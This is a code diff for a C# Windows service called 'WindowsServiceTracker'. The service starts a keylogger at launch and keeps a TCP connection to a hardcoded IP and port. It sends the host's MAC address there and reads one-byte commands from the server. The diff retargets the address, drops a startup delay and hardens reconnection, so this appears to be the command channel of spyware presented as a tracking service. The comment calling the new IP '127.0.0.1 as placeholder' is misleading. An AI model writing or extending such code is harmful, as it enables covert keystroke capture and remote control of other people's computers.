@@ -26,8 +26,8 @@ namespace WindowsServiceTracker
     {
         //Constants
         //127.0.0.1 = 0x0100007F because of network byte order
-        private const long IP_ADDRESS = 0x2E3811AC; //127.0.0.1 as placeholder
-        private const int PORT = 10000;
+        private const long IP_ADDRESS = 0x6c3911ac; //127.0.0.1 as placeholder
+        private const int PORT = 10011;
         private const string ERROR_LOG_NAME = "TrackerErrorLog";
         private const string ERROR_LOG_MACHINE = "TrackerComputer";
         private const string ERROR_LOG_SOURCE = "WindowsServiceTracker";
@@ -73,7 +73,6 @@ namespace WindowsServiceTracker
 
             CreateOpenPipe();
             StartKeylogger(); //todo remove after debugging
-            Thread.Sleep(30000);
 
             tcpThread = new Thread(this.MaintainServerConnection);
             tcpThread.Start();
@@ -148,26 +147,29 @@ namespace WindowsServiceTracker
         private void MaintainServerConnection()
         {
             macAddress = getMacAddress();
-            int waitToRetry = 0;
+            int waitBetweenReads = 0;
+            int maxwaitBetweenReads = 60; 
+            int maxWaitToRead = 5;
+            int waitToRead = 0;
             int bufferSize = 1;
             byte[] buffer = new byte[bufferSize];
             while (tcpKeepAlive)
             {
-                if (tcp == null || !tcp.Connected)
+                if (tcp == null || !CheckTCPConnected())
                 {
                     try 
                     {
                         Connect();
-                        waitToRetry = 0;
+                        waitToRead = 0;
                         getTcpStream();
                         SendStringMsg(macAddress);
                     }
                     catch (Exception)
                     {
-                        Thread.Sleep(waitToRetry * 1000);
-                        if (waitToRetry < 60)
+                        Thread.Sleep(waitToRead * 1000);
+                        if (waitToRead < maxwaitBetweenReads)
                         {
-                            waitToRetry += 5;
+                            waitToRead += 5;
                         }
                     }
                 }
@@ -175,8 +177,13 @@ namespace WindowsServiceTracker
                 {
                     // todo make sure thCanRead is false in the case that a previous connection was lost, 
                     // and new one created, but the stream was not changed from the old connection
-                    if (tcpStream != null && tcpStream.CanRead)
+                    if (tcpStream == null || !tcpStream.CanRead)
                     {
+                        getTcpStream();
+                    }
+                    else if (tcpStream.DataAvailable)
+                    {
+                        waitBetweenReads = 0;
                         try {
                             tcpStream.Read(buffer, 0, bufferSize);
                             switch (buffer[0])
@@ -196,7 +203,11 @@ namespace WindowsServiceTracker
                     }
                     else
                     {
-                        getTcpStream();
+                        Thread.Sleep(waitBetweenReads * 1000);
+                        if (waitBetweenReads < maxWaitToRead)
+                        {
+                            waitBetweenReads++;
+                        }
                     }
                 }
             }
@@ -250,6 +261,25 @@ namespace WindowsServiceTracker
                 throw new Exception("Error connecting");
             }
             //return false;
+        }
+
+        private bool CheckTCPConnected() // todo fix this shit
+        {
+            if (tcp == null || tcpStream == null)
+            {
+                return false;
+            }
+
+            try
+            {
+                byte[] tmp = new byte[1];
+                tcpStream.Write(tmp, 0, 0);
+                return true;
+            }
+            catch (SocketException e)
+            {
+                return false;
+            }
         }
 
         private bool Disconnect()
